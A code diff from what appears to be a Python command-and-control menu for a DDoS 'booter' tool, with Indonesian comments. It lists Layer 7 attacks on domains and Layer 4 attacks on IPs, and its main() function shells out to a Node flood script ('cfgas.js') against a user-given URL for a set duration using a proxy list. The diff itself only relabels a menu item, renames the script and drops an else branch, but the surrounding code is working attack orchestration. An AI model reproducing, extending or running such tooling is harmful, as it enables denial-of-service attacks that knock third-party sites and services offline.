@@ -299,7 +299,7 @@ def menu():
     # Teks menu akan PUTIH statis
     print(draw_middle_line("LAYER7  ► SHOW LAYER7 METHODS FOR ATTACK DOMAIN", box_content_width, align='left', color_code="\x1b[37m")) 
     print(draw_middle_line("LAYER4  ► SHOW LAYER4 METHODS FOR ATTACK IP", box_content_width, align='left', color_code="\x1b[37m")) 
-    print(draw_middle_line("USAGE   ► USAGE PANEL", box_content_width, align='left', color_code="\x1b[37m"))
+    print(draw_middle_line("USAGE   ► SHOW EXAMPLE USAGE PANEL", box_content_width, align='left', color_code="\x1b[37m"))
     print(draw_middle_line("GETPROXY   ► UPDATE PROXY", box_content_width, align='left', color_code="\x1b[37m"))
     print(draw_middle_line("CLEAR   ► CLEAR TERMINAL", box_content_width, align='left', color_code="\x1b[37m")) 
     print(draw_bottom_border(box_content_width))
@@ -791,7 +791,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                              
-               os.system(f'node cfgasv2 {url} {time} 100 100 proxies.txt')
+               os.system(f'node cfgas.js {url} {time} 100 100 proxies.txt')
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -1097,9 +1097,7 @@ def main():
                 print(f"Waktu tidak valid: {ve}")
             except Exception as e:
                 print(f"Terjadi kesalahan saat menjalankan perintah: {e}")   
-            else:
-                print(f"Unknown command: '{cnc}'. Type 'usage' for available commands.")                                                                                                                                                                                    
-
+                                                                                                                                                                                 
 def generate_and_verify_captcha(length=4):
     while True:
         characters = string.ascii_uppercase
